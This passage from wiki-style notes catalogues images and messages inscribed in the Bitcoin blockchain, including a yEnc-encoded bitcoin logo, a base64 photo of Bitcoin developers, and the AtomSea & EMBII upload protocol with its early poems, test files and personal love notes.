- [https://www.reddit.com/r/Bitcoin/comments/2p4on0/paystampercom_receive_unlimited_detailed_payments/](https://www.reddit.com/r/Bitcoin/comments/2p4on0/paystampercom_receive_unlimited_detailed_payments/)

#### Custom encoded images of unknown source

↑ **Parent:** [Images](#images)

<a id="image-bitcoin-jpg"></a>
<img src="https://web.archive.org/web/20220116140433im_/http://static.righto.com/images/bitcoin/bitcoin.jpg" alt="" height="300">

**[Figure 18](#image-bitcoin-jpg). `bitcoin.jpg`**. [Source](http://www.righto.com/2014/02/ascii-bernanke-wikileaks-photographs.html). <a id="_234"></a>
A bitcoin logo on [block 123573](https://www.blockchain.com/explorer/blocks/btc/123573) (2011-05-13).

<a id="_235"></a>
This is the very first ASCII string to show up at [https://github.com/cirosantilli/bitcoin-inscription-indexer](https://github.com/cirosantilli/bitcoin-inscription-indexer) after only the [Genesis block message](cryptocurrency.md#genesis-block-message).

<a id="_236"></a>
This version of the image was just ripped from [Hidden surprises in the Bitcoin blockchain by Ken Shirriff (2014)](#hidden-surprises-in-the-bitcoin-blockchain-by-ken-shirriff-2014).

<a id="_237"></a>
Reconstructing it should likely be a simple matter of copy pasting the ASCII [yEnc](computer.md#yenc) encoding present in the two transactions from [tx ceb1a7fb57ef8b75ac59b56dd859d5cb3ab5c31168aa55eb3819cd5ddbd3d806](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0123.txt#L11) into a text file and decoding the [yEnc](computer.md#yenc), but after searching for 20 minutes Ciro couldn't find a working yEnc decoder on [Ubuntu 21.10](systems-programming.md#ubuntu-21-10). How can a format be so dead, even after considerable extensive use in the [Usenet](website.md#usenet)??? It makes you think about life.

<a id="_238"></a>
As mentioned by Ken, the logo is split across two transactions: [ceb1a7fb57ef8b75ac59b56dd859d5cb3ab5c31168aa55eb3819cd5ddbd3d806](https://www.blockchain.com/explorer/transactions/btc/ceb1a7fb57ef8b75ac59b56dd859d5cb3ab5c31168aa55eb3819cd5ddbd3d806) and 9173744691ac25f3cd94f35d4fc0e0a2b9d1ab17b4fe562acc07660552f95518.

<a id="_239"></a>
There appears to be nothing strictly linking the two transactions, besides that they are very close by and the only ASCII strings around back in those pre-infinite-spam days, as can be seen at: [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0123.txt#L11](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0123.txt#L11), so you could just see both of them by eye.

<a id="_240"></a>
Also the first one starts with:<a id="_241"></a>

```
=ybegin line=128 size=8776 name=bitcoin.jpg
```
and the second one ends in:<a id="_242"></a>

```
=yend size=8776 crc32=a7ac8449
```
so this is likely clearly part of the yEnc format for someone who knows it, and the filename `bitcoin.jpg` gives the file format.

<a id="_243"></a>
They are not even in the same block:<a id="_244"></a>

<a id="_245"></a>
- [https://www.blockchain.com/btc/tx/ceb1a7fb57ef8b75ac59b56dd859d5cb3ab5c31168aa55eb3819cd5ddbd3d806](https://www.blockchain.com/btc/tx/ceb1a7fb57ef8b75ac59b56dd859d5cb3ab5c31168aa55eb3819cd5ddbd3d806) is in block 123573
<a id="_246"></a>
- [https://www.blockchain.com/btc/tx/9173744691ac25f3cd94f35d4fc0e0a2b9d1ab17b4fe562acc07660552f95518](https://www.blockchain.com/btc/tx/9173744691ac25f3cd94f35d4fc0e0a2b9d1ab17b4fe562acc07660552f95518) is in block 123571
both from 2011-05-13. Also note that they ended up being committed reverse order, since you don't have a strict order control over the final blockchain.

---

<a id="image-v27ssra-jpg"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/v27sSra.jpg" alt="" height="500">

**[Figure 19](#image-v27ssra-jpg). v27sSra.jpg**. <a id="_247"></a>
An image of a dozen people siting at a dinner table, with each person identified by a [Twitter](social-technology.md#twitter) handle that was edited in.

<a id="_248"></a>
This image is present [tx 4be3a833ee83b4ca7d157d60fbf7411f7528314ce90df8a844f855118bc6ca11 from block 357239](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/in/0357.txt#L384) (2015-05-20), an input transaction.

<a id="_249"></a>
It contains a base 64 encoded image:<a id="_250"></a>

```
v27sSra.jpg

/9j/4AAQSkZJRgABAQEASABIAAD/2wBDACgcHiMeGSgjISMtKygwPGRBPDc3PHtYXUlkkYCZlo+A
...
TAkBaMxbbhuYXGDMyXw/MIV84IqrE//Z
...
```

<a id="_251"></a>
By manually copy pasting that into a file `v27sSra.base64` we can obtain the image with:<a id="_252"></a>

```
base64 -d <v27sSra.base64 >v27sSra.jpg
```
The exact same content appears to be present on the next input transaction 56d23a230042c094bc54bb72fc4c10a3f26750030b9927994e741d3689f5c09e on the same block.

<a id="_253"></a>
[Google reverse image search](google.md#google-reverse-image-search) leads to [https://freedom-to-tinker.com/2015/05/21/the-story-behind-the-picture-of-nick-szabo-with-other-bitcoin-researchers-and-developers/](https://freedom-to-tinker.com/2015/05/21/the-story-behind-the-picture-of-nick-szabo-with-other-bitcoin-researchers-and-developers/) The story behind the picture of [Nick Szabo](cryptocurrency.md#nick-szabo) with other Bitcoin researchers and developers by Arvind Narayanan (2015), in which Arvind ([@random\_walker](https://twitter.com/random_walker)) who attended the meeting clearly lists all names and handles, and talks about the background of gathering of Bitcoin devs that happened in March 2014. The article also contains a higher resolution version of the image uploaded to the blockchain.

<a id="_254"></a>
It also links to a popular [Reddit](website.md#reddit) thread that contains the image from May 2015: [https://www.reddit.com/r/Bitcoin/comments/36hfu4/pic_coredevs_having_dinner_with_nick_szabo/](https://www.reddit.com/r/Bitcoin/comments/36hfu4/pic_coredevs_having_dinner_with_nick_szabo/)

<a id="_255"></a>
[Googling](google.md) `v27sSra.jpg` leads to [https://bitcointalk.org/index.php?topic=1061926.220;wap](https://bitcointalk.org/index.php?topic=1061926.220;wap) "New York Times identifies Nick Szabo as Satoshi Nakamoto" which links to [https://i.imgur.com/v27sSra.jpg](https://i.imgur.com/v27sSra.jpg) so this is a  [Satoshi Nakamoto](cryptocurrency.md#satoshi-nakamoto)-real-identity thing.

---

<h4 id="atomsea-and-embii">AtomSea &amp; EMBII</h4>

↑ **Parent:** [Images](#images)

<a id="_257"></a>
"AtomSea & EMBII" refers to an upload system for various media types includeing text, images, HTML pages and audio.

<a id="_258"></a>
The official name used by its creators for the protocol is [P2FK](#atomsea-and-embii) (Pay To Future Key).

<a id="_259"></a>
The name "AtomSea & EMBII" is a reference to the online handles of its creators. That string appears to be added as padding in the protocol and is therefore visible repeatebly in the blockchain, though it is sometimes cut up a bit. The following online profiles of the creators feel authentic:<a id="_260"></a>

<a id="_261"></a>
- [EMBII](software.md#embii)<a id="_262"></a>

  <a id="_263"></a>
  - [https://twitter.com/EMBII4U](https://twitter.com/EMBII4U) EMBII replies on Twitter and given his knowledge of the subject he's undoubtedly one of the creators, not to mention likely owning private keys and repeatedlyt proving so
<a id="_264"></a>
- AtomSea:<a id="_265"></a>

  <a id="_266"></a>
  - [https://twitter.com/TheAtomSea](https://twitter.com/TheAtomSea)
  <a id="_267"></a>
  - [https://github.com/AtomSea](https://github.com/AtomSea)
<a id="_268"></a>
- HugPuddle<a id="_269"></a>

  <a id="_270"></a>
  - [https://github.com/HugPuddle](https://github.com/HugPuddle)
Tried saying hi to them at: [https://twitter.com/cirosantilli/status/1382080760774033415](https://twitter.com/cirosantilli/status/1382080760774033415) and they replied: [https://twitter.com/AllenVandever/status/1563964396656812034](https://twitter.com/AllenVandever/status/1563964396656812034)

<a id="_271"></a>
The feature-set of their protocol is impressive:<a id="_272"></a>

<a id="_273"></a>
- various media formats:<a id="_274"></a>

  <a id="_275"></a>
  - <a id="_276"></a>
    multipage setups: `The Mahabharata` [https://bitfossil.org/root/0618f12af65a4e82f8e7b41f8578721dfeb109e9a73ff71aebdbc982696e3720/](https://bitfossil.org/root/0618f12af65a4e82f8e7b41f8578721dfeb109e9a73ff71aebdbc982696e3720/)

    <a id="image-illustration-for-the-mahabharata-inscription"></a>
    ![](https://web.archive.org/web/20230221120627im_/http://bitfossil.com/0618f12af65a4e82f8e7b41f8578721dfeb109e9a73ff71aebdbc982696e3720/Mahabharata.jpg)

    **[Figure 20](#image-illustration-for-the-mahabharata-inscription). Illustration for The Mahabharata inscription**.
  <a id="_277"></a>
  - image galleries: [https://bitfossil.org/root/ae8d3b46b934bedc363e11abe8c8607171994470957c286274f699a0b3a9bbd7/index.htm](https://bitfossil.org/root/ae8d3b46b934bedc363e11abe8c8607171994470957c286274f699a0b3a9bbd7/index.htm)
  <a id="_278"></a>
  - audio: `Spock_Live_Long_And_Prosper.mp3` [https://bitfossil.org/root/1bc87dbff1ff5831287f62ac7cf95579794e4386688479bab66174963f9a4a0c/index.htm](https://bitfossil.org/root/1bc87dbff1ff5831287f62ac7cf95579794e4386688479bab66174963f9a4a0c/index.htm)
<a id="_279"></a>
- social fetures:<a id="_280"></a>

  <a id="_281"></a>
  - author photo below post via signture! [https://bitfossil.org/root/738ab32bf82e3e0d4d2b29e40ad194cbbef6685d0116e94371e3cef4992349c8/index.htm](https://bitfossil.org/root/738ab32bf82e3e0d4d2b29e40ad194cbbef6685d0116e94371e3cef4992349c8/index.htm) (testnet) See the `SIGNED BY` with EMBII's photo! This feature was added in January 2015[https://x.com/EMBII4U/status/1941021109996212391](https://x.com/EMBII4U/status/1941021109996212391)<a id="_282"></a>

    <a id="_283"></a>
    - <a id="_284"></a>
      selling your uploads! I.e., a [Bitcoin](cryptocurrency.md#bitcoin)-based [NFT](cryptocurrency.md#non-fungible-token) system.

      <a id="_285"></a>
      For example, this lists the buy and sell orders for [Figure 39. "`YellowRobot.jpg`"](#image-yellowrobot-jpg): [https://p2fk.io/GetObjectByAddress/17mdB8cVCQVhBi46bF43JpniZ4DAgE3JjH?mainnet=true&verbose=true](https://p2fk.io/GetObjectByAddress/17mdB8cVCQVhBi46bF43JpniZ4DAgE3JjH?mainnet=true&verbose=true)

      <a id="_286"></a>
      The NFT system was retroactively added on top of signatures, it didn't exist at the time signatures were added. The first listing was made on December 2023[https://x.com/EMBII4U/status/1940885431132082240](https://x.com/EMBII4U/status/1940885431132082240):<a id="_287"></a>


      > <a id="_288"></a>
      > my first official listing was a 10th anniversary!🥹
      > 
      > <a id="_289"></a>
      > "aww.png"
      > 
      > <a id="_290"></a>
      > etched by embii 12/25/2013

      <a id="_291"></a>
      Inscriptions without signature such as those from before signatures were added can be claimed by the first person who claims them without any cryptographic proof[https://x.com/EMBII4U/status/1941023431535034727](https://x.com/EMBII4U/status/1941023431535034727):<a id="_292"></a>


      > <a id="_293"></a>
      > unsigned URN can be claimed and traded by the first who try they are basically free for all public domain
      > 
      > <a id="_294"></a>
      > I claimed most of my 2013-2014 objects but there are still a few left for treasure hunters my 2015 signed objects will be moved at my leisure many will never be listed

      <a id="image-creation-jpg"></a>
      <img src="https://web.archive.org/web/20240607052310im_/https://bitfossil.org/4c7d8f6e7082a30d2d2d07c47ab462ea389415f4b95559106ff5f83f2bca8c82/creation.jpg" alt="" height="600">

      **[Figure 21](#image-creation-jpg). `creation.jpg`**. [Source](https://bitfossil.org/4c7d8f6e7082a30d2d2d07c47ab462ea389415f4b95559106ff5f83f2bca8c82/index.htm). [tx 4c7d8f6e7082a30d2d2d07c47ab462ea389415f4b95559106ff5f83f2bca8c82](https://bitfossil.org/4c7d8f6e7082a30d2d2d07c47ab462ea389415f4b95559106ff5f83f2bca8c82/index.htm) (March 2015) seems to have a summary of the system. It shows in particular the cross-blockchain mechanism that mad EMBII implemented.
  <a id="_295"></a>
  - sending messages to other people. TODO example.
  <a id="_296"></a>
  - voting. TODO example.
<a id="_297"></a>
- tooling:<a id="_298"></a>

  <a id="_299"></a>
  - <a id="_300"></a>
    [Sup!?](cryptocurrency.md#sup-p2fk-client) a local GUI client

    <a id="video-sup-buying-listing-and-offers-by-embii"></a>
    **[Video 4](#video-sup-buying-listing-and-offers-by-embii). Sup!? Buying, Listing and Offers by EMBII.** [Source](https://www.youtube.com/watch?v=cr6XjUrmmNY).
  <a id="_301"></a>
  - [bitfossil.org](#bitfossil-org) is an indexer website for the inscriptions. For example [https://bitfossil.org/67b2facfd8160d4fa11b02829b6387d07537b57a7a24f19b029b2a5ae7b81830/](https://bitfossil.org/67b2facfd8160d4fa11b02829b6387d07537b57a7a24f19b029b2a5ae7b81830/) displays [Figure 39. "`YellowRobot.jpg`"](#image-yellowrobot-jpg) which was inscribed at toplevel transaction [tx 67b2facfd8160d4fa11b02829b6387d07537b57a7a24f19b029b2a5ae7b81830](https://www.blockchain.com/explorer/transactions/btc/67b2facfd8160d4fa11b02829b6387d07537b57a7a24f19b029b2a5ae7b81830). Functionality seems a bit limited compared to the local clients however, e.g. you can't see all uploades by a given author.
  <a id="_302"></a>
  - [http://apertus.io/](http://apertus.io/) TODO vs Sup? At [https://x.com/EMBII4U/status/1929498259883536886](https://x.com/EMBII4U/status/1929498259883536886) EMBII tries to explain it but not sure.
Basically they've created a fully descentralized Bitcoin-based social media. Their system is basically a sligly more clunky superset of [Ordinal ruleset inscriptions](#ordinal-ruleset-inscription), just way older and way less known for whatever reason.

<a id="_303"></a>
Each [P2FK](#atomsea-and-embii) inscription is done over [P2FKH](cryptocurrency.md#fake-p2pkh-address) payloads. Each inscription a toplevel transaction which links to other transactions. All the linked transactions together make up the payload. The most common payload type is a text plus image, as is the case of [Nelson-Mandela.jpg](#nelson-mandela-jpg), which can be seen at [https://bitfossil.org/root/78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e/](https://bitfossil.org/root/78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e/) where `78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e` is the toplevel transaction ID: [https://www.blockchain.com/btc/tx/78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e](https://www.blockchain.com/btc/tx/78f0e6de0ce007f4dd4a09085e649d7e354f70bc7da06d697b167f353f115b8e) See [Section "Nelson-Mandela.jpg"](#nelson-mandela-jpg) for a detailed reverse engineering of the format, and [Section "AtomSea & EMBII data format"](#atomsea-and-embii-data-format) for a summary of it.

<a id="_304"></a>
The system shows the messages and the images on a single page: [https://bitfossil.org/root/4cbb32cd27b5b5edc12d3559bdffc1355ac2a210463d5cfaadc7ce9b06675b2b/index.htm](https://bitfossil.org/root/4cbb32cd27b5b5edc12d3559bdffc1355ac2a210463d5cfaadc7ce9b06675b2b/index.htm) It is basically a blockchain-based Twitter.

<a id="_305"></a>
Somewhat related projects:<a id="_306"></a>

<a id="_307"></a>
- [http://www.memorymatrix.org/](http://www.memorymatrix.org/)

<a id="_308"></a>
At [https://twitter.com/EMBII4U/status/1762501350997233976](https://twitter.com/EMBII4U/status/1762501350997233976) (2024) [EMBII](software.md#embii) mentions that he was inspired by the [Satoshi uploader](cryptocurrency.md#satoshi-uploader).

<h5 id="early-atomsea-and-embii-uploads">Early AtomSea &amp; EMBII uploads</h5>

↑ **Parent:** [AtomSea & EMBII](#atomsea-and-embii)

<a id="_310"></a>
These are of course likely all made by AtomSea & EMBII themselves while developing/testing their upload system.

<a id="_311"></a>
They are also artsy peoeple themselves, and as pointed at [https://twitter.com/AllenVandever/status/1563964396656812034](https://twitter.com/AllenVandever/status/1563964396656812034) what they were doing was basicaly [non-fungible token](cryptocurrency.md#non-fungible-token) art, which became much much more popular a few years later around 2021.

<a id="_312"></a>
The first upload that we could find at [https://github.com/cirosantilli/bitcoin-inscription-indexer/tree/3f53e152ec9bb0d070dbcb8f9249d92f89effa70#atomsea-index](https://github.com/cirosantilli/bitcoin-inscription-indexer/tree/3f53e152ec9bb0d070dbcb8f9249d92f89effa70#atomsea-index) was [tx 44e80475dc363de2c7ee17b286f8cd49eb146165a79968a62c1c2c4cf80772c9](https://www.blockchain.com/explorer/transactions/btc/44e80475dc363de2c7ee17b286f8cd49eb146165a79968a62c1c2c4cf80772c9) on [block 272573](https://www.blockchain.com/explorer/blocks/btc/272573) (2013-12-01) but it does not show on Bitfossil: [https://bitfossil.org/root/44e80475dc363de2c7ee17b286f8cd49eb146165a79968a62c1c2c4cf80772c9/](https://bitfossil.org/root/44e80475dc363de2c7ee17b286f8cd49eb146165a79968a62c1c2c4cf80772c9/). This is was due to an upload bug explained by the following entry. By looking at the ASCII data at [https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0272.txt#L449](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0272.txt#L449) that this is meant to contain the same content as the following message: a quote from the [Bhagavad Gita](religion.md#bhagavad-gita), so this is definitely a bugged version of the following one.

<a id="_313"></a>
The next one is [tx c9d1363ea517cd463950f83168ce8242ef917d99cd6518995bd1af927d335828](https://bitfossil.org/root/c9d1363ea517cd463950f83168ce8242ef917d99cd6518995bd1af927d335828/) block 272577 (2013-12-02). It actually shows on bifossil at [https://bitfossil.org/?object=1GSt59J2LxjmEshSbkDwZ2Sj4kFCcaw4WD](https://bitfossil.org/?object=1GSt59J2LxjmEshSbkDwZ2Sj4kFCcaw4WD) and it reads:<a id="_314"></a>


> I WONDER WHAT HISTORY WILL THINK ABOUT THESE FIRST FEW BUGS...HA HA HA. NOBODY IS PERFECT.

followed by:<a id="_315"></a>


> <a id="_316"></a>
> He who regards  
> With an eye that is equal  
> Friends and comrades,  
> The foe and the kinsman,  
> The vile, the wicked,  
> The men who judge him,  
> And those who belong  
> To neither faction:  
> He is the greatest.
> 
> <a id="_317"></a>
> ~[Bhagavad - Gita](religion.md#bhagavad-gita)

The bug message is definitely a reference to the previous non-visible bugged upload [https://bitfossil.org/root/4b72a223007eab8a951d43edc171befeabc7b5dca4213770c88e09ba5b936e17/](https://bitfossil.org/root/4b72a223007eab8a951d43edc171befeabc7b5dca4213770c88e09ba5b936e17/), TODO understand exactly how they fucked up. This illustrates the beauty of the blockchain very well: unlike with [version control](software.md#version-control), you don't just see selected snapshots: you see actual debug logs!!! In 2026 [EMBII](software.md#embii) comments that it was coincidentally inscribed on [NeptuneMonk](https://x.com/NeptuneMonk) in his birthday, a early contributor, so he gifted it to him.[https://x.com/EMBII4U/status/2054585103578194156](https://x.com/EMBII4U/status/2054585103578194156)

<a id="image-wearestarstuff-jpg"></a>
![](https://web.archive.org/web/20230604115203im_/http://bitfossil.org/8d1b3c094b782198deb7381efb57b1208244375e7a1029ec159306d6a8fd25d8/WeAreStarStuff.jpg)

**[Figure 22](#image-wearestarstuff-jpg). `WeAreStarStuff.jpg`**. [Source](https://bitfossil.org/root/8d1b3c094b782198deb7381efb57b1208244375e7a1029ec159306d6a8fd25d8). <a id="_318"></a>
The third [AtomSea & EMBII](#atomsea-and-embii) upload, and the first actual image.

<a id="_319"></a>
Message:<a id="_320"></a>


> Photo etchin' test. \#AtomSea \#embii (photo by Travis Ehrich)

The image shows showingAtomSea and EMBII together, presumably photographed by [this dude](https://travis-t-ehrich.tumblr.com/archive).

<a id="_321"></a>
The filename is of course a reference to the quote/idea: [We Are Made of Star-Stuff](physicist.md#we-are-made-of-star-stuff) that was much popularized by [Carl Sagan](physicist.md#carl-sagan).

<a id="_322"></a>
[tx 81f6d302a0ed4ffefa674834d0c4a02cdc6639f213713d48946225956fc96d85](https://www.blockchain.com/explorer/transactions/btc/8d1b3c094b782198deb7381efb57b1208244375e7a1029ec159306d6a8fd25d8), [block 272592](https://www.blockchain.com/explorer/blocks/btc/272592) (2013-12-02)

<a id="_323"></a>
[https://bitfossil.org/root/fac0b9a4f90414710b806fd286e020aea2404498946845ef3783f305dd4cd3a7](https://bitfossil.org/root/fac0b9a4f90414710b806fd286e020aea2404498946845ef3783f305dd4cd3a7) (2024-01-13) contains a cropped version with only AtomSea persent.

---

<a id="image-hugpuddle-jpg"></a>
![](https://web.archive.org/web/20220125112530im_/http://bitfossil.org/86a0e565ba2698d4abc03253b9de47e88d3de4f62ee90722e6e7845a1c8e3aa7/HugPuddle.jpg)

**[Figure 23](#image-hugpuddle-jpg). `HugPuddle.jpg`**. [Source](https://bitfossil.org/root/86a0e565ba2698d4abc03253b9de47e88d3de4f62ee90722e6e7845a1c8e3aa7). <a id="_324"></a>
The fourth [AtomSea & EMBII](#atomsea-and-embii) upload, and the second image. Message:<a id="_325"></a>


> HugPuddle Testing Apertus Disk Drive

<a id="_326"></a>
[tx 86a0e565ba2698d4abc03253b9de47e88d3de4f62ee90722e6e7845a1c8e3aa7](https://www.blockchain.com/explorer/transactions/btc/86a0e565ba2698d4abc03253b9de47e88d3de4f62ee90722e6e7845a1c8e3aa7), [block 272592](https://www.blockchain.com/explorer/blocks/btc/272592) (2013-12-02)

---

<a id="_327"></a>
And then finally we meet Chiharu, EMBII's partner, with her hair painted blond (she's [Japanese](japan.md)): [ILoveYouMore.jpg](#iloveyoumore-jpg).

<a id="_328"></a>
Then there are two undecoded ones TODO investigate:<a id="_329"></a>

<a id="_330"></a>
- [https://bitfossil.org/root/78f31f03da7d15db96dc824bf96b39f010bb733969c62f27f2f8fb2738e74557](https://bitfossil.org/root/78f31f03da7d15db96dc824bf96b39f010bb733969c62f27f2f8fb2738e74557)
<a id="_331"></a>
- [https://bitfossil.org/root/4c8cf0e647e3b3e5878856b7057e625e0fcbb01d714a6a4eabb91ffc4495f0c3](https://bitfossil.org/root/4c8cf0e647e3b3e5878856b7057e625e0fcbb01d714a6a4eabb91ffc4495f0c3)

<a id="_332"></a>
Then [Nelson-Mandela.jpg](#nelson-mandela-jpg).

<a id="_333"></a>
Then there's an approximation of [pi](formalization-of-mathematics.md#pi) as ASCII decimal fraction [on tx 70fd289901bae0409f27237506c330588d917716944c6359a8711b0ad6b4ce76](https://bitfossil.org/root/70fd289901bae0409f27237506c330588d917716944c6359a8711b0ad6b4ce76/) from [block 273522](https://www.blockchain.com/explorer/blocks/btc/273522) (2013-12-07):<a id="_334"></a>


> 3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989

<a id="_335"></a>
[tx b8b9f50a354166c46b69ecd47a0fbd20ee78c3471d2557bf275aff1b4cf4752d](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0273.txt#L48) (2013-12-07) [on bitfossil.org](https://bitfossil.org/b8b9f50a354166c46b69ecd47a0fbd20ee78c3471d2557bf275aff1b4cf4752d/)) contains [Where the Sidewalk Ends by Shel Silverstein](https://en.wikipedia.org/wiki/Where_the_Sidewalk_Ends):<a id="_336"></a>


> <a id="_337"></a>
> There is a place where the sidewalk ends  
> And before the street begins,  
> And there the grass grows soft and white,  
> And there the sun burns crimson bright,  
> And there the moon-bird rests from his flight  
> To cool in the peppermint wind.
> 
> <a id="_338"></a>
> Let us leave this place where the smoke blows black  
> And the dark street winds and bends.  
> Past the pits where the asphalt flowers grow  
> We shall walk with a walk that is measured and slow,  
> And watch where the chalk-white arrowls go  
> To the place where the sidewalk ends.
> 
> <a id="_339"></a>
> Yes we'll walk with a walk that is measured and slow,  
> And we'll go where the chalk-white arrows go,  
> For the children, they mark, and the children, they know  
> The place where the sidewalk ends.

<a id="_340"></a>
[tx 56768b30dec33bd284223d85c23087975e2360b3391d20d505aa59a5675e5379](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0274.txt#L8) (2013-12-13, [on bitfossil.org](https://bitfossil.org/56768b30dec33bd284223d85c23087975e2360b3391d20d505aa59a5675e5379)):<a id="_341"></a>


> <a id="_342"></a>
> Dear Aliens,
> 
> <a id="_343"></a>
> Hey.
> 
> <a id="_344"></a>
> Sincerely,  
> EMBII & AtomSea

<a id="_345"></a>
[tx 415c702759893c63b3a57a7d196b014e51b2a33d2396c74b8e71acfaff6b9360](https://github.com/cirosantilli/bitcoin-inscription-indexer/blob/master/data/out/0274.txt#L28) ([2013-12-14](https://www.blockchain.com/explorer/transactions/btc/415c702759893c63b3a57a7d196b014e51b2a33d2396c74b8e71acfaff6b9360)) contains a poem by [13th century Persian poet Rumi](https://en.wikipedia.org/wiki/Rumi) (TODO find [bitfossil.org](#bitfossil-org) toplevel), starting with:<a id="_346"></a>


> My dear friend  
> never lose hope  
> when the Beloved  
> sends you away.

Reproduced e.g. at: [https://www.abuddhistlibrary.com/Buddhism/H%20-%20World%20Religions%20and%20Poetry/World%20Religions/Islam/Teachers/Rumi/My%20dear%20friend/Rumi%20-%20my%20dear%20friend.htm](https://www.abuddhistlibrary.com/Buddhism/H%20-%20World%20Religions%20and%20Poetry/World%20Religions/Islam/Teachers/Rumi/My%20dear%20friend/Rumi%20-%20my%20dear%20friend.htm)

<a id="_347"></a>
[https://bitfossil.org/root/73ca50321147bac9010bec43d63f7f76857fe9ede240cc89710e28723fdb242f/](https://bitfossil.org/root/73ca50321147bac9010bec43d63f7f76857fe9ede240cc89710e28723fdb242f/) ([2013-12-14](https://www.blockchain.com/explorer/transactions/btc/73ca50321147bac9010bec43d63f7f76857fe9ede240cc89710e28723fdb242f/)) has message:<a id="_348"></a>


> MULTIFILE SUPPORT TEST

and links to 3 .txt files `1.txt`, `2.txt`, `3.txt` containing single characters `1`, `2`, and `3`.

<a id="image-compressedlogo-png"></a>
![](https://web.archive.org/web/20240130020052im_/http://bitfossil.org/dd750b6dfc799ad63b450f3942a3d8739831a4a1a03ffea32531bc3539026af2/CompressedLogo.png)

**[Figure 24](#image-compressedlogo-png). CompressedLogo.png**. [Source](https://bitfossil.org/root/dd750b6dfc799ad63b450f3942a3d8739831a4a1a03ffea32531bc3539026af2/). <a id="_349"></a>
[2013-12-20](https://www.blockchain.com/explorer/transactions/btc/dd750b6dfc799ad63b450f3942a3d8739831a4a1a03ffea32531bc3539026af2). Message:<a id="_350"></a>


> <a id="_351"></a>
> Colby Nelson and myself burnt the midnight oils designing the APERTUS imagery last night....
> 
> <a id="_352"></a>
> Thanks Colby for all your help.

Possibly [https://www.linkedin.com/in/colby-nelson-59b538207/](https://www.linkedin.com/in/colby-nelson-59b538207/).

<a id="_353"></a>
Contains an Apertus logo which is used on [https://bitfossil.org/root/](https://bitfossil.org/root/) itself, presumably they were designing that logo.

---

<h6 id="iloveyoumore-jpg">ILoveYouMore.jpg</h6>

↑ **Parent:** [Early AtomSea & EMBII uploads](#early-atomsea-and-embii-uploads)

<a id="_355"></a>
This is the first of many love declarations and mentions EMBII makes of his partner Chiharu! This came just one day afte the very first uploads of the system.

<a id="image-iloveyoumore-jpg"></a>
![](https://web.archive.org/web/20220102091437im_/http://bitfossil.org/affbac1bfde690c1fabd60812d046c911b2882038a42b18a4d2e7cb50e989604/ILoveYouMore.jpg)

**[Figure 25](#image-iloveyoumore-jpg). `ILoveYouMore.jpg`**. [Source](https://bitfossil.org/root/affbac1bfde690c1fabd60812d046c911b2882038a42b18a4d2e7cb50e989604/). <a id="_356"></a>
Message:<a id="_357"></a>


> My Dearest Chiharu....I Love you more. \<3 Eric

Note that she's [Japanese](japan.md) and not really bond, it's hair dye.

<a id="_358"></a>
[tx affbac1bfde690c1fabd60812d046c911b2882038a42b18a4d2e7cb50e989604](https://www.blockchain.com/explorer/transactions/btc/affbac1bfde690c1fabd60812d046c911b2882038a42b18a4d2e7cb50e989604), [block 272593](https://www.blockchain.com/explorer/blocks/btc/272593) (2013-12-02)

---

<a id="image-ourwedding-jpg"></a>
![](https://web.archive.org/web/20240120195025im_/http://bitfossil.org/393f4d3b3b0ac018b6483f58390ac0d56adf5f70f68e846af7d745359ca14bf9/OurWedding.jpg)

**[Figure 26](#image-ourwedding-jpg). `OurWedding.jpg`**. [Source](https://bitfossil.org/root/393f4d3b3b0ac018b6483f58390ac0d56adf5f70f68e846af7d745359ca14bf9/). <a id="_359"></a>
Message:<a id="_360"></a>


> My Dearest Chiharu, I will love you forever. Taken Aug 6th 2014 in Ipswich, SD.

<a id="_361"></a>
[393f4d3b3b0ac018b6483f58390ac0d56adf5f70f68e846af7d745359ca14bf9](https://www.blockchain.com/explorer/transactions/btc/393f4d3b3b0ac018b6483f58390ac0d56adf5f70f68e846af7d745359ca14bf9), [block 314482](https://www.blockchain.com/explorer/blocks/btc/314482) (2014-08-07)

---

<a id="image-madybobbyofftocollege-jpg"></a>
![](https://web.archive.org/web/20240202111544im_/http://bitfossil.org/937f70bf641ccabaf623772367df64bd867ad44c53fd227d01f2662e74aeacbf/MadyBobbyOffToCollege.jpg)

**[Figure 27](#image-madybobbyofftocollege-jpg). `MadyBobbyOffToCollege.jpg`**. [Source](https://bitfossil.org/root/937f70bf641ccabaf623772367df64bd867ad44c53fd227d01f2662e74aeacbf/). <a id="_362"></a>
Associated messages:<a id="_363"></a>


> <a id="_364"></a>
> A \#father could not ask for more perfect daughters. I \#Love you both so much!! \<3 Pa
> 
> <a id="_365"></a>
> My oldest daugher moves into the dorms tomorrow morning. Dear Mady, You are forever my baby. \<3 Pa

[EMBII](software.md#embii)'s daughter, Maddy Bobby, (presumably not with Chiharu) is going off to college! Sadface.

<a id="_366"></a>
[tx 937f70bf641ccabaf623772367df64bd867ad44c53fd227d01f2662e74aeacbf](https://www.blockchain.com/explorer/transactions/btc/937f70bf641ccabaf623772367df64bd867ad44c53fd227d01f2662e74aeacbf) (2016-01-28)

---

<a id="image-chiharu-embii-and-the-atom-sea-say-happy-halloween-jpg"></a>
